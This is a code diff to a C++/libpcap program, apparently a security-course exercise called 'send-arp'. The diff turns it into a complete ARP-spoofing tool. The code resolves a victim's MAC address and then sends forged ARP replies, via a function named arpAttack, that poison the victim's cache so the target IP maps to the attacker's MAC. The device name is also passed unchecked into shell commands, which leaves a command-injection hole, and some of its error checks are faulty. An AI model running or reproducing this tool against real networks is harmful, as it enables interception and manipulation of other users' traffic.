@@ -12,6 +12,8 @@
 #include <array>
 #include <memory>
 #include <sstream>
+#include <unistd.h>
+#include <algorithm> 
 
 using namespace std;
 
@@ -27,7 +29,6 @@ void usage() {
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-
 string execCommand(const string& cmd) {
     array<char, 128> buffer;
     string result;
@@ -41,202 +42,220 @@ string execCommand(const string& cmd) {
     return result;
 }
 
-class MyNet{
+class MyNet {
 private:
-	string myNetStatus;
-	string myIP;
-	string myIPBroad;
-	string myMac;
-	string gateway;
+    string dev;
+    string myNetStatus;
+    string myRoute;
+    string myIP;
+    string myIPBroad;
+    string myMac;
+    string gateway;
+
 public:
-	MyNet(string device){
-		this->myNetStatus = execCommand("sh -c 'ip address show "+device+"'");
-		int _tIndex1 = myNetStatus.find("inet")+5;
-		int _tIndex2 = myNetStatus.find("/", _tIndex1);
-		this->myIP = myNetStatus.substr(_tIndex1, _tIndex2 - _tIndex1);
-		int _tIndex3 = myNetStatus.find("brd", _tIndex2)+4;
-		int _tIndex4 = myNetStatus.find("scope", _tIndex3);
-		this->myIPBroad = myNetStatus.substr(_tIndex3, _tIndex4 - _tIndex3 - 1);
-		this->myMac = myNetStatus.substr(myNetStatus.find("link/ether")+11,17);
-		this->gateway = execCommand("sh -c 'route |grep " + device + " |grep G'");
-	}
+    MyNet(string device) {
+        this->dev = device;
+        this->myNetStatus = execCommand("ip address show " + device);
+        int _tIndex1 = myNetStatus.find("inet") + 5;
+        int _tIndex2 = myNetStatus.find("/", _tIndex1);
+        if (_tIndex1 == string::npos || _tIndex2 == string::npos) {
+            throw runtime_error("Failed to parse IP address.");
+        }
+        this->myIP = myNetStatus.substr(_tIndex1, _tIndex2 - _tIndex1);
+        
+        int _tIndex3 = myNetStatus.find("brd", _tIndex2) + 4;
+        int _tIndex4 = myNetStatus.find("scope", _tIndex3);
+        if (_tIndex3 == string::npos || _tIndex4 == string::npos) {
+            throw runtime_error("Failed to parse broadcast address.");
+        }
+        this->myIPBroad = myNetStatus.substr(_tIndex3, _tIndex4 - _tIndex3 - 1);
+        this->myMac = myNetStatus.substr(myNetStatus.find("link/ether") + 11, 17);
+        this->myRoute = execCommand("route -nn | grep " + device + " | grep G");
+        istringstream iss(myRoute);
+        string _;
+        iss >> _ >> this->gateway;
+        if (this->gateway.empty()) {
+            throw runtime_error("Failed to parse gateway.");
+        }
+        cout << "!!!!MYNET!!!!" << endl;
+    }
 
-	string getMyMac(){
-		return this->myMac;
-	}
+    char* getDev() {
+        return &dev[0];
+    }
 
-	string getMyIP(){
-		return this->myIP;
-	}
+    string getMyMac() {
+        return this->myMac;
+    }
 
-	string getMyIPBroad(){
-		return this->myIPBroad;
-	}
+    string getMyIP() {
+        return this->myIP;
+    }
 
-	string getGateway(){
-		return this->gateway;
-	}
+    string getMyIPBroad() {
+        return this->myIPBroad;
+    }
 
-
+    string getGateway() {
+        return this->gateway;
+    }
 };
 
-class ArpResource
-{
+class ArpResource {
 public:
-	string eth_smac;
-	string eth_dmac;
-	string arp_smac;
-	string arp_tmac;
-	string arp_sip;
-	string arp_tip;
-	ArpResource(
-		string eth_smac,
-		string eth_dmac,
-		string arp_smac,
-		string arp_tmac,
-		string arp_sip,
-		string arp_tip
-		){
-			this->eth_smac = eth_smac;
-			this->eth_dmac = eth_dmac;
-			this->arp_smac = arp_smac;
-			this->arp_tmac = arp_tmac;
-			this->arp_sip  = arp_sip;
-			this->arp_tip  = arp_tip;
-		}
+    string eth_smac;
+    string eth_dmac;
+    string arp_smac;
+    string arp_tmac;
+    string arp_sip;
+    string arp_tip;
 
+    ArpResource(string eth_smac, string eth_dmac, string arp_smac, string arp_tmac, string arp_sip, string arp_tip)
+        : eth_smac(eth_smac), eth_dmac(eth_dmac), arp_smac(arp_smac), arp_tmac(arp_tmac), arp_sip(arp_sip), arp_tip(arp_tip) {}
 };
 
-
-
-string getMyIP(string dev){
-	string myNet = execCommand("sh -c 'ip link show wlan0 | grep link/ether'");
-	string myMac = myNet.substr(myNet.find("link/ether")+11,17);
-	return myMac;
-}
-
-
-string getMyMAC(string dev){
-	string myNet = execCommand("sh -c 'ip link show "+dev+" | grep link/ether'");
-	string myMac = myNet.substr(myNet.find("link/ether")+11,17);
-	return myMac;
-}
-
-int arpSend(char* dev, int type, ArpResource arpST){
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return -1;
-	}
-
-	EthArpPacket packet;
-
-	packet.eth_.dmac_ = Mac("94:76:b7:f3:09:0a");
-	packet.eth_.smac_ = Mac("a0:47:d7:11:53:91");
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Reply);
-	packet.arp_.smac_ = Mac("a0:47:d7:11:53:91");
-	packet.arp_.sip_ = htonl(Ip("10.3.3.1"));
-	packet.arp_.tmac_ = Mac("94:76:b7:f3:09:0a");
-	packet.arp_.tip_ = htonl(Ip("0.0.0.0"));
-
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-	}
-
-	pcap_close(handle);
-
-	return 0;
-}
-
-bool checkIP(string ip){
-	vector<string> parts;
-	int start = 0;
-	int end = 0;
-	int partCount = 0;
-	for(int i = 0; i!=3; ++i){
-		end = ip.find('.', start);
-		if(end == string::npos){
-			return false;
-		}
-
-		string part = ip.substr(start, end - start);
-
-		if (part.empty() || part.size() > 3) {
-            return false;
-        }
-
-        for (char c : part) {
-            if (!isdigit(c)) {
-                return false;
-            }
-        }
-
-        int num = stoi(part);
-        if (num < 0 || num > 255) {
-            return false;
-        }
-
-        if (part.size() > 1) {
-            return false;
-        }
-
-        start = end + 1;
-	}
-	string part = ip.substr(start);
-    if (part.empty() || part.size() > 3) {
-        return false;
+int arpSend(char* dev, int type, ArpResource arpST) {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
     }
 
-    for (char c : part) {
-        if (!isdigit(c)) {
-            return false;
+    EthArpPacket packet;
+    packet.eth_.dmac_ = Mac(arpST.eth_dmac);
+    packet.eth_.smac_ = Mac(arpST.eth_smac);
+    packet.eth_.type_ = htons(EthHdr::Arp);
+
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+
+    packet.arp_.op_ = htons((type == 0) ? ArpHdr::Request : ArpHdr::Reply);
+    packet.arp_.smac_ = Mac(arpST.arp_smac);
+    packet.arp_.sip_ = htonl(Ip(arpST.arp_sip));
+    packet.arp_.tmac_ = Mac(arpST.arp_tmac);
+    packet.arp_.tip_ = htonl(Ip(arpST.arp_tip));
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
+    pcap_close(handle);
+    return res;
+}
+
+string getMacOnARPReply(char* dev, string myMac) {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (handle == nullptr) {
+        throw runtime_error("Couldn't open device " + string(dev) + ": " + string(errbuf));
+    }
+
+    struct bpf_program fp;
+    string filter_exp = "arp";
+    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
+        pcap_close(handle);
+        throw runtime_error("Couldn't parse filter " + filter_exp + ": " + string(pcap_geterr(handle)));
+    }
+
+    if (pcap_setfilter(handle, &fp) == -1) {
+        pcap_close(handle);
+        throw runtime_error("Couldn't install filter " + filter_exp + ": " + string(pcap_geterr(handle)));
+    }
+
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+
+        EthArpPacket* recvPacket = (EthArpPacket*)packet;
+
+        if (ntohs(recvPacket->eth_.type_) == EthHdr::Arp &&
+            ntohs(recvPacket->arp_.op_) == ArpHdr::Reply &&
+            recvPacket->eth_.dmac_ == Mac(myMac)) {
+            pcap_close(handle);
+            return string(recvPacket->arp_.smac_);
         }
     }
 
-    int num = stoi(part);
-    if (num < 0 || num > 255) {
-        return false;
-    }
-
-    if (part.size() > 1) {
-        return false;
-    }
-	return true;
+    pcap_close(handle);
+    throw runtime_error("No ARP reply received for the specified MAC address");
 }
 
+bool checkIP(const string& ip) {
+    vector<string> parts;
+    istringstream iss(ip);
+    string part;
+    while (getline(iss, part, '.')) {
+        parts.push_back(part);
+    }
+    if (parts.size() != 4) return false;
+    for (const string& p : parts) {
+        if (p.empty() || p.size() > 3 || !all_of(p.begin(), p.end(), ::isdigit)) {
+            return false;
+        }
+        int num = stoi(p);
+        if (num < 0 || num > 255) return false;
+    }
+    return true;
+}
+
+string getMacOfIP(MyNet& myNet, const string& ip) {
+    arpSend(myNet.getDev(), 0, ArpResource(
+        myNet.getMyMac(),
+        "FF:FF:FF:FF:FF:FF", 
+        myNet.getMyMac(),
+        "00:00:00:00:00:00",
+        myNet.getMyIP(),
+        ip
+    ));
+    return getMacOnARPReply(myNet.getDev(), myNet.getMyMac());
+}
+
+bool arpAttack(MyNet& myNet, const string& senderIP, const string& targetIP) {
+    string senderMac = getMacOfIP(myNet, senderIP);
+    cout << "arpSend" << endl;
+
+    return arpSend(myNet.getDev(), 1, ArpResource(
+        myNet.getMyMac(),
+        senderMac, 
+        myNet.getMyMac(),
+        senderMac,
+        targetIP,
+        senderIP
+    )) == 0;
+}
 
 int main(int argc, char* argv[]) {
-	if ((argc < 4) || (argc %2)) {
-		usage();
-		return -1;
-	}
-	vector<string> argument;
-	for (int i = 2; i != argc; ++i){
-		cout << argv[i] << endl;
-		argument.push_back(argv[i]);
-	}
-	for (int i = 0; i != argument.size(); ++i){
-		if(!checkIP(argument[i])) {
-			usage();
-			return(-1);	
-		}
-	}
-	MyNet myNet = MyNet(argv[1]);
-	
-	cout << myNet.getGateway() << endl;
-	cout << "myIP: " << myNet.getMyIP() << endl;
-	cout << "myIPBroad: " << myNet.getMyIPBroad() << endl;
-	cout << "myMac: " << myNet.getMyMac() << endl;
-	map<string,string> mapOfIPMac;
-	
+    if (argc < 4 || argc % 2 != 0) {
+        usage();
+        return -1;
+    }
 
+    vector<string> argument;
+    for (int i = 2; i < argc; ++i) {
+        cout << argv[i] << endl;
+        argument.push_back(argv[i]);
+    }
 
+    try {
+        MyNet myNet(argv[1]);
+        for (size_t i = 0; i < argument.size(); i += 2) {
+            if (!checkIP(argument[i]) || !checkIP(argument[i + 1])) {
+                usage();
+                return -1;
+            }
+            arpAttack(myNet, argument[i], argument[i + 1]);
+        }
+    } catch (const exception& e) {
+        cerr << e.what() << endl;
+        return -1;
+    }
+
+    return 0;
 }
